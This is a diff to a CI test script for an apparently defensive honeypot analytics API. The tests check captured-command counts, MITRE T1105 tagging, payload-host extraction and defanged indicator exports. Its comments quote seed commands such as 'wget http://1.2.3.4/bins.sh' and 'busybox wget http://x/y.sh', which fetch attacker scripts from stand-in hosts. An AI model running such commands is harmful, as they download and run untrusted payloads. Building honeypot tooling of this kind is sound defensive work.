@@ -168,7 +168,7 @@ jobs:
           assert "top-asn leader is AS4134"      "4134"       "$(jq_get "$PUB/top-asn?limit=5"      '.rows[0].asn')"
           assert "top-asn unique_ips"            "2"          "$(jq_get "$PUB/top-asn?limit=5"      '.rows[0].unique_ips')"
           assert "top-countries leader is CN"    "CN"         "$(jq_get "$PUB/top-countries?limit=5" '.[0].country_iso')"
-          assert "commands returns rows"         "8"          "$(jq_get "$PUB/commands?limit=100"   '.total')"
+          assert "commands returns rows"         "9"          "$(jq_get "$PUB/commands?limit=100"   '.total')"
           assert "creds returns rows"            "5"          "$(jq_get "$PUB/creds?limit=100"      '.total')"
           assert "files returns rows"            "2"          "$(jq_get "$PUB/files?limit=100"      '.total')"
           assert "sessions returns rows"         "4"          "$(jq_get "$PUB/sessions?limit=100"   '.total')"
@@ -185,9 +185,9 @@ jobs:
           echo "--- MITRE tagging is applied server-side ---"
           assert "wget tagged T1105" "true" \
             "$(jq_get "$PUB/commands?limit=100&search=wget" '[.rows[].tags[]] | index("T1105") != null')"
-          assert "tag filter narrows results" "2" \
+          assert "tag filter narrows results" "3" \
             "$(jq_get "$PUB/commands?limit=100&tag=T1105" '.total')"
-          assert "an unknown tag is ignored, not fatal" "8" \
+          assert "an unknown tag is ignored, not fatal" "9" \
             "$(jq_get "$PUB/commands?limit=100&tag=NOPE" '.total')"
 
           echo "--- search escaping ---"
@@ -204,7 +204,7 @@ jobs:
           assert "files: literal % matches none" "0" "$(jq_get "$PUB/files?limit=100&search=%25" '.total')"
           assert "asn:   literal % matches none" "0" "$(jq_get "$PUB/top-asn?limit=100&search=%25" '.total')"
           # In-memory filtering path.
-          assert "commands: a real term matches" "2" "$(jq_get "$PUB/commands?limit=100&search=wget" '.total')"
+          assert "commands: a real term matches" "3" "$(jq_get "$PUB/commands?limit=100&search=wget" '.total')"
           assert "commands: nonsense matches none" "0" "$(jq_get "$PUB/commands?limit=100&search=zzzq" '.total')"
 
           echo "--- session drill-down ---"
@@ -243,11 +243,12 @@ jobs:
           assert "unknown format falls back to json" "200" "$(status "$PUB/iocs?format=xml")"
 
           echo "--- payload delivery infrastructure ---"
-          # The seed runs `wget http://1.2.3.4/bins.sh` and
-          # `busybox wget http://x/y.sh`, so two hosts must fall out: one an
-          # address, one a name.
+          # The seed runs `wget http://1.2.3.4/bins.sh`,
+          # `busybox wget http://x/y.sh` and `wget http://9.8.7.6:8080/x`, so
+          # three hosts must fall out: an address, a name, and an address on a
+          # non-standard port.
           assert "200 payload-hosts" "200" "$(status "$PUB/payload-hosts")"
-          assert "extracts both delivery hosts" "2" "$(jq_get "$PUB/payload-hosts" '.total')"
+          assert "extracts every delivery host" "3" "$(jq_get "$PUB/payload-hosts" '.total')"
           assert "the busiest host first" "1.2.3.4" "$(jq_get "$PUB/payload-hosts" '.rows[0].host')"
           assert "addresses are marked as such" "true" "$(jq_get "$PUB/payload-hosts" '.rows[0].is_ip')"
           assert "hostnames are not" "false" \
@@ -257,10 +258,13 @@ jobs:
           # A host must never appear with a path or scheme still attached.
           assert "hosts are bare" "0" \
             "$(jq_get "$PUB/payload-hosts" '[.rows[].host | select(test("/|:"))] | length')"
+          # The port belongs to the URL, not to the host it is grouped under.
+          assert "a ported host groups under its bare address" "true" \
+            "$(jq_get "$PUB/payload-hosts" '[.rows[].host] | any(. == "9.8.7.6")')"
 
           echo "--- payload URLs as exportable indicators ---"
           assert "200 iocs?type=urls" "200" "$(status "$PUB/iocs?type=urls")"
-          assert "exports both URLs" "2" "$(jq_get "$PUB/iocs?type=urls" '.rows | length')"
+          assert "exports every URL" "3" "$(jq_get "$PUB/iocs?type=urls" '.rows | length')"
           # hxxp:// and bracketed dots: the convention for putting a live
           # malware URL in a ticket without it becoming a link.
           assert "defangs the scheme" "true" \
@@ -273,6 +277,26 @@ jobs:
             "$(curl -fsS "$PUB/iocs?type=urls&format=txt" | grep -q '^http://1.2.3.4/bins.sh$' && echo true || echo false)"
           assert "csv export names its columns" "true" \
             "$(curl -fsS "$PUB/iocs?type=urls&format=csv" | grep -q '^url,host,first_seen,last_seen$' && echo true || echo false)"
+          # An address defangs last-dot-only whether or not it carries a port.
+          # Shipped broken: the port sat inside the host capture, the address
+          # test failed on it, and the name branch bracketed every dot — so one
+          # export held both "9.8.7[.]6:8080" and "9[.]8[.]7[.]6:8080" shapes.
+          assert "a ported address defangs like an unported one" "true" \
+            "$(jq_get "$PUB/iocs?type=urls&defang=1" '[.rows[].url] | any(contains("hxxp://9.8.7[.]6:8080/x"))')"
+          assert "no address is over-bracketed" "0" \
+            "$(jq_get "$PUB/iocs?type=urls&defang=1" '[.rows[].url | select(test("[0-9]\\[\\.\\][0-9]+\\[\\.\\]"))] | length')"
+          # Dates must be ISO 8601. String(Date) yields the runtime locale form
+          # ("Sat Jul 25 2026 ... (Eastern European Summer Time)"), which no
+          # consumer of an indicator feed can parse. This shipped in every CSV.
+          assert "csv timestamps are ISO 8601" "true" \
+            "$(curl -fsS "$PUB/iocs?type=urls&format=csv" | grep -qE '^[^#].*,[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9:.]+Z,' && echo true || echo false)"
+          assert "ip csv timestamps are ISO 8601 too" "true" \
+            "$(curl -fsS "$PUB/iocs?hours=24&format=csv" | grep -qE ',[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9:.]+Z,[0-9]{4}-' && echo true || echo false)"
+          # The URL export is not windowed, so it must not claim a window.
+          assert "url export states its real coverage" "true" \
+            "$(curl -fsS "$PUB/iocs?type=urls&format=txt" | grep -q '^# window: all captured commands' && echo true || echo false)"
+          assert "the ip export still states its window" "true" \
+            "$(curl -fsS "$PUB/iocs?hours=24&format=txt" | grep -q '^# window: last 24h' && echo true || echo false)"
 
           echo "--- k-anonymous password lookup ---"
           # sha256("123456") = 8d969eef6eca...  The seed uses it under two
